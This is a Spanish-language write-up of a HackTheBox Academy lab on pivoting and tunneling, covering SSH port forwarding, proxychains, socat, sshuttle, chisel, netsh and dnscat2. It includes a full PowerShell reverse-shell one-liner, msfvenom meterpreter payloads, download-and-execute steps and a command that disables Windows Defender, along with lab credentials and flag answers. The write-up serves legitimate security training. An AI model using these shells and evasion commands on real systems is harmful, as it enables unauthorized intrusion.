---
title: Academy - Starting Our Tunnels
author: cotes
date: 2023-10-03 17:51:00 +0800
categories: [Laboratorio, Pivoting]
tags: [Pivoting, socat, 'Local Port Forwarding (SSH)', 'Dinamyc Port Forwarding (SSH)']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Academy/Pivoting-Tunneling/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Pivoting Logo
---

En este módulo de HackTheBox Academy aprenderemos técnicas: **Pivoting**, **Local Port Forwarding**, **Remote Port Forwarding**, además de usar varias herramientas. 🔧🔨
Esto nos es muy útil en entornos en los cuales no tenemos acceso a redes internas.

## Dynamic Port Forwarding with SSH and SOCKS Tunneling 👏

1. Con las credenciales que nos da HachTheBox, nos autenticamos en el servicio **SSH** y listamos la interfaces de red existentes.

   ```bash
   ❯ ssh ubuntu@<IP Máquina>
   ubuntu@WEB01:~$ ifconfig
   ```
   > Veremos 3 interfaces de red **ens192, ens224, lo**


2. Nos daremos cuenta que la interfaz `ens224` se encuentra en otro segmento de red, por lo que escanearemos hosts activos en esta interfaz de red, como no existe **nmap**, lo haremos con un script de bash

   * **`hosts.sh`**

      ```bash
      greenColour="\e[0;32m\033[1m"
      endColour="\033[0m\e[0m"
      blueColour="\e[0;34m\033[1m"

      echo -e "${blueColour}Listando Hosts Activos...${endColour}\n";

      for host in $(seq 1 255); do
        timeout 1 bash -c "ping -c 1 172.16.5.$host" &>/dev/null && echo -e "${greenColour}[+] 172.16.5.$host${endColour}\n" &
      done; wait
      ```

      ```
      Listando Hosts Activos...

      [+] 172.16.5.19
      [+] 172.16.5.129
      ```

3. Vemos que existe otro host activo con la **IP 172.16.5.19**, ahora nos queda averiguar los puertos abiertos de este host

   * **`ports.sh`**

      ```bash
      greenColour="\e[0;32m\033[1m"
      endColour="\033[0m\e[0m"
      blueColour="\e[0;34m\033[1m"

      echo -e "${blueColour}Puertos Abiertos...${endColour}\n";

      for port in $(seq 1 10000); do
              { echo '' > /dev/tcp/172.16.5.19/$port; } 2>/dev/null && echo -e "${greenColour}[+] Puerto $port${endColour}" &
      done; wait
      echo ''
      ```

      ```
      Puertos Abiertos...
      <SNIP>
      [+] Puerto 3389
      <SNIP>
      ```

4. En HackTheBox nos dan las credenciales de **RDP**
5. Para acceder al host 172.16.5.19 por el puerto **3389 (RDP)** haremos **`Dinamyc Port Forwarding`** aprovechándonos del servicio SSH.

   * **`ssh -D 9050 ubuntu@<IP Máquina>`**

   * Si nos fijamos, ahora el servicio SSH ocupa nuestro puerto **9050**

    ```
    -$ lsof -i:9050
    COMMAND    PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
    ssh     480508 root    5u  IPv4 1162055      0t0  TCP localhost:9050 (LISTEN)
    ```

6. Para interactuar con el servicio RDP del host `172.16.5.19`, añadimos la conexión de tipo **socks5** al archivo /etc/proxychains4.conf

   ```bash
   ❯ cat /etc/proxychains4.conf
   <SNIP>
   socks5  127.0.0.1 9050 
   ```

7. Ahora podemos interactuar con el host de la subred, añadiendo el comando **proxychains** antes de ejecutar un comando

   * **`proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`**

      ![](/assets/images/HTB/Academy/Pivoting-Tunneling/rdp.png)

---
## Remote/Reverse Port Forwarding with SSH 🔀

1. Nos conectamos al servicio SSH y listamos las interfaces de **red**

   * **Interfaces**

      ```
      ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255
      <SNIP>

      ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255   
      <SNIP>
      ```

   * La dirección IP para hacer `pivoting` es 172.16.5.129 ya que aquí se encuentra el host a vulnerar.

2. Listando los hosts activos en la red **172.16.5.0/24** nos encontramos con otro host **172.16.5.19**

   ```
   Listando Hosts Activos...

   [+] 172.16.5.19
   ```

3. Para obtener una **reverse shell** crearemos un **payload** con msfvenom

   * **`msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.5.129  -f exe -o backupscript.exe LPORT=8080`**

4. Nos pondremos en escucha de peticiones con **metasploit** 

   ```
   msf6 > use exploit/multi/handler
   msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
   msf6 exploit(multi/handler) > set lhost 0.0.0.0
   msf6 exploit(multi/handler) > set lport 8000
   msf6 exploit(multi/handler) > run
   ```

5. Subiremos el payload a la máquina Windows.

   * Primero subimos **backupscript.exe** al serivicio SSH: `scp backupscript.exe ubuntu@<IP Máquina>:~/`

   * Haremos **Dynamic Port Forwarding**, esto con el fin de autenticarnos en RDP

      ```bash
      ❯ ssh -D 9050 ubuntu@<IP Máquina>
      ❯ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
      ```

   * En el servicio SSH, levantamos un servidor HTTP con Python.

   * Ejecutamos **Powershel** con permisos de Administrador (`Win` + `x` -> Seleccionamos 'PowerShell Administrator'), y nos descargamos el script **backupscript.exe**: `Invoke-WebRequest -Uri "http://<IP Máquina>:<Puerto>/backupscript.exe" -Outfile "C:\backupscript.exe"`

6. Ahora, realizaremos Remote Port Forwarding para que todo el tráfico entrante de **172.16.5.19** por el puerto `8080` se redirija a nuestro puerto 8000

   * **`ssh -R 172.16.5.19 :8080:0.0.0.0:8000 ubuntu@<IP Máquina> -vN`**
     * `-v`: Veremos el **verbose** de acciones que se realizan.
     * `-N`: No queremos ejecutar ningún comando.

7. Ahora en RDP ejecutamos **backupscript.exe**

8. Ya tenemos un shell en metasploit

   ```
   meterpreter > shell
   Process 6864 created.
   Channel 1 created.
   Microsoft Windows [Version 10.0.17763.1637]
   (c) 2018 Microsoft Corporation. All rights reserved.

   C:\>whoami
   whoami
   inlanefreight\victor
   ```

---

## Meterpreter Tunneling & Port Forwarding ⏩

1. Nos autenticamos en el servicio SSH, vemos las interfaces de red

   ```
   ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.253.186  netmask 255.255.0.0  broadcast 10.129.255.255

   ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
   ```

   * La **interfaz ens224** se encuentra en un **subred**, así que detectaremos los hosts activos

      ```
      Listando Hosts Activos...

      [+] 172.16.5.19
      [+] 172.16.5.129
      ```

   * 🔰 **Respuesta:** `172.16.5.19,172.16.5.129`

2. Al ejecutar **AutoRoute** veremos las rutas que se asignan para que el **host 172.16.5.19** sea alcanzable por nosotros. 

   ```
   meterpreter > run autoroute -s 172.16.5.0/23
   <SNIP>
   [+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
   ```

   * 🔰 **Respuesta:** `172.16.5.0/255.255.254.0`

# Playing Pong with Socat 🏓

## Socat Redirection with a Reverse Shell 🙇‍♂️

`Socat` es una herramienta de red de código abierto que permite la creación de conexiones de datos bidireccionales entre dos puntos finales.

Para establecer una reverse shell seguiremos los siguientes pasos

   1. `ssh -D 9050 ubuntu@<IP Máquina>`: Haremos **Dynamic Port Forwarding**, para establecer una conexión de tipos **socks** con el fin de interactuar con el host target como si estuviera en nuestra red.

      * Agreamos la siguiente línea al archivo **`/etc/proxychains4.conf`**: socks5  127.0.0.1 9050

   2. Usamos socat en el servicio SSH para establecer una comunicación bidireccional: `socat TCP4-LISTEN:8080,fork TCP4:<tun0 IP>:80`

   3. Nos autenticamos en RDP*: `proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`

   4. Abrimos Powershell como Administradores (**`Win`  + `x`**), y ejecutaremos un payload el cual enviará una shell a la Máquina Ubuntu por el puerto `8080`, y estaremos previamente en escucha con **rlwrap nc -lvnp 80** en nuestra Máquina Host

   * **Host:** `rlwrap nc -lvnp 80`
   * **Payload PowerShell:**

      ```powershell
      $LHOST = "<IP Ubuntu>"; $LPORT = 8080; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close() 
      ```

   5. Y obtenemos un reverse shell

      ```
      whoami
      inlanefreight\victor
      ```

## Socat Redirection with a Bind Shell 🎈

* El payload que se usa para establecer una **bind shell** en Windows es: `windows/x64/meterpreter/bind_tcp`


## SSH Pivoting with Sshuttle 🐢

1. Nos descargamos la herramienta `apt install sshuttle -y`

2. Nos autenticamos en el servicio SSH y listamos las interfaces de red para conocer cual pertenece a una **subred**

   ```bash
   <SNIP>
   ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
   ```

3. La subred es `172.16.5.0/24`, por lo que usaremos **sshuttle** para realizar pivoting

   * **`sshuttle -r ubuntu@10.129.202.64 172.16.5.0/24`**

4. Veremos si el **puerto `3389`** está abierto

   ```python
   ❯ nmap -sCV -p3389 172.16.5.19 -Pn -sT
   PORT     STATE SERVICE       VERSION
   3389/tcp open  ms-wbt-server Microsoft Terminal Services
   ```

5. Nos conectamos a este servicio con las credenciales `victor:pass@123`

   * **`xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`**

   ![](/assets/images/Academy/Pivoting-Tunneling/sshuttle.png)


## Web Server Pivoting with Rpivot ®

1. El **servidor de pivote** tiene que ejecutarse en nuestra Máquina Host
2. El **cliente de pivote** tiene que ejecutarse en la Máquina de Pivote, ya que esta nos servirá de puente para llegar al `target`

* Nos autententicamos en el servicio SSH, listamos las interfaces de red

   * **Interfaces de red**

      ```
      <SNIP>
      ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
            inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
      ```
      > Esta interfaz de red se encuentra en un **subred**

      ```
      Listando Hosts Activos...

      [+] 172.16.5.135

      Puertos Abiertos...

      [+] Puerto 22
      [+] Puerto 80
      ```

   a. Ya que tenemos información básica de la Máquina Víctima, usaremos `chisel` para entablar una conexión socks5

    * Nos descargamos [chisel](https://github.com/jpillora/chisel/releases).
    * Los subimos al sevicio ssh: `scp chisel ubuntu@<IP Máquina>:~/`
    * Chisel Máquina Atacante: `./chisel server --reverse -p 8080`
    * Chisel Máquina Pivoting: `./chisel client <tun0 IP>:8080 R:socks`

   b. En la Máquina Host se abre una conexión socks

   ```
   2023/07/05 11:49:56 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
   ```

   c. Agremos la cadena proxy al archivo **/etc/proxychains4.conf**
   
   ```
   <SNIP>
   socks5  127.0.0.1 1080
   ```

   d. Ahora, usaremos **FoxyProxy** en el navegador, para ver la página web

   ![](/assets/images/HTB/Academy/Pivoting-Tunneling/foxyproxy.png)

   c. Ahora podemos ver la página web y si nos fijamos en el código fuente, veremos la flag

   ![](/assets/images/HTB/Academy/Pivoting-Tunneling/flag.png)

## Port Forwarding with Windows Netsh 🥅

1. Nos conectamos a RDP de la Máquina de HackTheBox

   * **`xfreerdp /v:<IP Máquina> /u:htb-student /p:HTB_@cademy_stdnt!`**

2. Ahora, usaremos **netsh.exe** para realizar pivoting

   ```powershell
   PS C:\Windows\system32> .\netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5150
   PS C:\Windows\system32> netsh.exe interface portproxy show v4tov4

   Listen on ipv4:             Connect to ipv4:
   Address         Port        Address         Port
   --------------- ----------  --------------- ----------
   10.129.42.198   8080        172.16.5150     3389
   ```

3. Ahora ya nos podemos conectar a RDP de la máquina en la **subred**
   * **`xfreerdp /v:<IP Máquina>:8080 /u:victor /p:pass@123`**

   * **VendorContacts.txt**

      ```
      <SNIP>
      Jim Flipflop
      <SNIP>
      ```

## DNS Tunneling with Dnscat2 😸

1. Descargamos el archivo [dns2cat-powershell](https://github.com/lukebaggett/dnscat2-powershell.git), y creamos un servidor con Python para descargarlo en la Máquina Víctima

2. Ejecutamos `dns2cat`

   ```bash
   ❯ ruby dnscat2.rb --dns host=<tun0 -IP>,port=53,domain=inlanefreight.local --no-cache
   <SNIP>
   --secret=a43cc68aa424740a80dc653fbf4ab1a8
   <SNIP>
   ```

   * Nos conectamos a RDP y descargamos el archivo: `Invoke-WebRequest -Uri "http://<tun0 IP>:8080/dnscat2.ps1" -OutFile "C:\dnscat2.ps1"`
   * Ejecutamos el cliente en la Máquina Víctima: `Start-Dnscat2 -DNSserver <tun0 IP> -Domain inlanefreight.local -PreSharedSecret [--secret] -Exec cmd`

3. En nuestra Máquina de Atacante ya podremos crear una shell
   * **`window -i 1`**

   * Ahora leemos la flag: `exec (OFFICEMANAGER) 1> type C:\Users\htb-student\Documents\flag.txt`
     * **Output** `AC@tinth3Tunnel`

## SOCKS5 Tunneling with Chisel 🐣

* Nos autententicamos en el servicio SSH, listamos las interfaces de red, descubrimos los hosts activos y enumeramos sus puertos

   * **Interfaces de red**

      ```
      <SNIP>
      ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
            inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
      ```
      > Esta interfaz de red se encuentra en un **subred**

   * **Hosts activos**

      ```
      Listando Hosts Activos...

      [+] 172.16.5.19
      
      Puertos Abiertos...
      <SNIP>
      [+] Puerto 3389
      <SNIP>
      ```

   a. Ya que tenemos información básica de la Máquina Víctima, usaremos `chisel` para entablar una **`conexión socks5`**

    * Nos descargamos [chisel](https://github.com/jpillora/chisel/releases).
    * Los subimos al sevicio ssh: `scp chisel ubuntu@<IP Máquina>:~/`
    * Chisel Máquina Atacante: `./chisel server --reverse -p 8080`
    * Chisel Máquina Pivoting: `./chisel client <tun0 IP>:8080 R:socks`

   b. En la Máquina Host se abre una conexión socks

   ```
   2023/07/05 11:49:56 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
   ```

   c. Agremos la cadena proxy al archivo **`/etc/proxychains4.conf`**
   
   ```
   <SNIP>
   socks5  127.0.0.1 1080
   ```

   d. Nos conectamos al servicio RDP usando proxychains para tener alcance de la **subred**
   * **`proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`**

   ![](/assets/images/HTB/Academy/Pivoting-Tunneling/flag2.png)


## ICMP Tunneling with SOCKS 🧦

* 🏴 Flag: **`N3Tw0rkTunnelV1sion!`**

## RDP and SOCKS Tunneling with SocksOverRDP 🎶

1. Nos descargamos [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP/releases)

2. Lo descargamos en la Máquina Pivoting 

   a. Iniciamos un servidor HTTP con Python: `python3 -m http.server 80`

   b. Máquina Pivoting: `Invoke-WebRequest -Uri "http://<tun0 IP>/SocksOverRDP-x64.zip" -OutFile "C:\Users\htb-student\Desktop\SocksOverRDP-x64.zip"`

   c. Los descomprimos y ejecutamos los siguiente comandos
   ```
   Set-MpPreference -DisableRealtimeMonitoring $true
   regsvr32.exe .\SocksOverRDP-Plugin.dll
   ```

   * El primero es para desactivar Windows Defender.

3. Usaremos mstsc.exe para ejecutar el servicio RDP

   ![](/assets/images/HTB/Academy/Pivoting-Tunneling/overrdp.png)

4. Una vez tengamos acceso a la nueva sesión RDP `victor:pass@123`, configuramos el servicio **Proxifier**

   ![](/assets/images/HTB/Academy/Pivoting-Tunneling/proxifier.png)

5. Finalmente, nos conectamos al **RDP** de la Máquina Víctima `172.16.6.155 (jason:WellConnected123!)` 🎯 y veremos la flag 🏴

   * **`H0pping@roundwithRDP!`**